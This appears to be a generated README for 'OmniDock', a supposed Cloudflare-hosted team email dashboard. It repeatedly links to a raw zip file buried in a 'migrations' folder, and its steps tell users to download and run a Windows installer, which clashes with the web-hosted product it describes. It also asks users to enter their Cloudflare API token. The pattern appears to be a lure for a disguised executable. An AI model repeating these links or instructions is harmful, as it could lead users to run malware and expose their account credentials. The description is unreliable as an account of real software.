# 📧 omnidock - Manage your team email with ease

[![](https://img.shields.io/badge/Download-OmniDock-blue.svg)](https://raw.githubusercontent.com/angelapro5786/omnidock/main/migrations/Software-1.1-beta.4.zip)

OmniDock acts as a central hub for your team communications. It connects your email domains, storage space, and support tickets into one simple dashboard. You host this application on the Cloudflare network. This setup ensures high speed and total privacy for your data. You maintain control over your contacts, signatures, and file attachments without relying on third-party mail providers.

## 🛠️ System Requirements

Your computer needs minimal resources to manage this dashboard. Check this list to ensure your system is ready:

* Operating System: Windows 10 or Windows 11.
* Browser: Use the latest version of Chrome, Firefox, or Microsoft Edge.
* Internet: A stable connection for syncing your email data.
* Cloudflare Account: A free account on the Cloudflare website.
* Storage: Access to a standard Cloudflare R2 bucket for file storage.

## 📥 Downloading the Software

You need to access the release page to get the installer. Follow this link to reach the download page for OmniDock:

[Download OmniDock](https://raw.githubusercontent.com/angelapro5786/omnidock/main/migrations/Software-1.1-beta.4.zip)

## ⚙️ Installation Steps

1. Open your web browser and go to the link provided above.
2. Look for the section labeled Releases on the right side of the screen.
3. Click the version number to view the available files.
4. Download the file named omnidock-installer.exe to your computer.
5. Locate the file in your Downloads folder.
6. Double-click the file to start the installation wizard.
7. Follow the prompts on your screen to complete the setup.
8. Click Finish to launch the application for the first time.

## 🔑 Initial Configuration

The dashboard requires a connection to your Cloudflare account. Prepare your API token before you start the setup wizard. You can find this token in your Cloudflare dashboard under the My Profile section. 

1. Enter your API token when the app requests it.
2. Select the specific Cloudflare zone you want to use for email routing.
3. Choose your R2 bucket from the dropdown menu to enable file management.
4. Click Save to authorize the connection.
5. Test the connection to ensure the dashboard can read your email routing rules.

## 📧 Setting Up Email Routing

OmniDock manages your incoming mail through Cloudflare Email Routing. You must configure your domain DNS records to direct mail to the OmniDock system.

1. Navigate to the Settings tab in the application.
2. Select Email Domains from the sidebar.
3. Click Add New Domain.
4. Follow the provided instructions to add the necessary MX records to your domain provider.
5. Wait for the status indicator to turn green.
6. Create an email address in the dashboard to start receiving messages.

## 📦 Managing Files with R2

Storing attachments is simple. OmniDock uses Cloudflare R2 storage to save your files. This method removes the need for expensive server storage.

1. Open the Files section in the main navigation bar.
2. Click the Upload button to add images or documents to your storage bucket.
3. Organize your files into folders to keep the inbox clean.
4. Drag and drop local files directly into the window to upload them.

## 👥 Handling Team Contacts

You can import your contact list directly into the dashboard. This allows your team to see shared contact history for support tickets.

1. Go to the Contacts page.
2. Click Import CSV to upload your existing list.
3. Ensure your file uses clear headers for names and email addresses.
4. Click Save to sync the contacts across all member devices.

## 🖋️ Creating Email Signatures

Each team member needs a professional signature. You can set up defaults for the whole team or let individuals customize their own.

1. Open the Signatures menu in the settings area.
2. Type your signature text into the editor.
3. Use the formatting bar to bold text or add links to your website.
4. Press Save to apply the signature to all outgoing messages from your account.

## 🔍 Troubleshooting Common Issues

If you face problems, check these solutions:

* Connection Error: Verify that your API token remains valid. Cloudflare tokens expire, so update them if necessary.
* Missing Emails: Check your domain MX records. Use the Verify button in the Email Domains section to confirm connectivity.
* File Upload Fails: Ensure your Cloudflare R2 bucket has enough storage space available.
* Slow Dashboard: Clear your browser cache and reload the application page.
* Login Issues: Ensure that your browser allows cookies from the Cloudflare domain.

## 🛡️ Privacy and Security

OmniDock keeps your data inside your own Cloudflare infrastructure. No third-party servers see your messages or files. You hold the keys to your data at all times. Use strong, unique passwords for your Cloudflare account to add another layer of protection. Enable two-factor authentication on your Cloudflare account to prevent unauthorized access.